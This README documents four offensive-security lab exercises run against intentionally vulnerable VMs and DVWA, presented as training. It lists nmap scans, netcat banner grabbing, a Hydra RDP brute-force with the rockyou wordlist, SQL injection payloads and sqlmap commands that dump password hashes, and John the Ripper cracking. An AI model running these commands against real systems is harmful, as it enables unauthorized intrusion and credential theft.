# Labs-Offensive-1
# Cybersecurity Labs Report

This repository documents a series of hands-on cybersecurity labs—four in total—performed within a VirtualBox environment to develop offensive (Red Team) skills. All exercises leveraged a **Kali Linux** attacker VM alongside **Windows 10** and **Metasploitable2/DVWA** targets.

---

## Table of Contents

1. [Environment Setup](#environment-setup)  
2. [Lab 1: Nmap Scanning & Enumeration](#lab-1-nmap-scanning--enumeration)  
3. [Lab 2: Service Banner Grabbing](#lab-2-service-banner-grabbing)  
4. [Lab 3: Brute-Force Attack with Hydra](#lab-3-brute-force-attack-with-hydra)  
5. [Lab 4: SQL Injection Exploitation](#lab-4-sql-injection-exploitation)  
6. [Conclusions & Next Steps](#conclusions--next-steps)

# Lab 1: Nmap Scanning & Enumeration
# Discover open ports on the target
nmap 192.168.56.102

# Detect service versions
nmap -sV 192.168.56.102

# Aggressive scan: OS detection, NSE scripts, traceroute
nmap -A 192.168.56.102

# Scan all 65,535 TCP ports
nmap -p- 192.168.56.102

# Save your aggressive scan to a file
nmap -A -oN lab1-scan.txt 192.168.56.102

# Lab 2: Service Banner Grabbing
# Grab SSH banner from port 22
nc -v 192.168.56.102 22

# Grab HTTP headers via Telnet
telnet 192.168.56.102 80
# then type:
# HEAD / HTTP/1.0

# List SMB shares (no password)
smbclient -L //192.168.56.102 -N

# Grab FTP banner on port 21
nc -v 192.168.56.102 21

# Lab 3: Brute-Force Attack with Hydra
# Decompress RockYou wordlist
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Launch an RDP brute-force against Administrator
hydra -t 4 -V -f -l Administrator \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.56.102 rdp

# Lab 4: SQL Injection Exploitation (DVWA in Docker)
# Start DVWA container
docker run -d --name dvwa -p 8080:80 vulnerables/web-dvwa

# Initialize the DVWA database (in browser):
# Visit http://127.0.0.1:8080/setup.php and click “Create/Reset Database”

# Manual bypass: return all rows
# Enter in DVWA “User ID” field:
1' OR '1'='1

# Discover database name
# (match 2-column UNION)
1' UNION SELECT NULL, database() -- 

# List all tables in dvwa
1' UNION SELECT NULL, GROUP_CONCAT(table_name) \
    FROM information_schema.tables \
   WHERE table_schema='dvwa' #

# Dump users’ table: usernames and MD5 hashes
1' UNION SELECT user, GROUP_CONCAT(password) FROM users #

# sqlmap: enumerate dvwa tables via UNION on id param
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=XYZ; security=low" \
       -p id --batch --dbms=mysql \
       --technique=U --union-cols=2 \
       -D dvwa --tables

# Save extracted hashes to a file
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hashes.txt
echo "e99a18c428cb38d5f260853678922e03" >> hashes.txt
echo "8d3533d75ae2c3966d7e0d4fcc69216b" >> hashes.txt
echo "0d107d09f5bbe40cade3de5c71e9e9b7" >> hashes.txt

# Crack MD5 hashes with John the Ripper
john --format=raw-md5 \
     --wordlist=/usr/share/wordlists/rockyou.txt \
     hashes.txt

# Show cracked passwords
john --show --format=raw-md5 hashes.txt


Report file is Uploaded and can be viewed there.
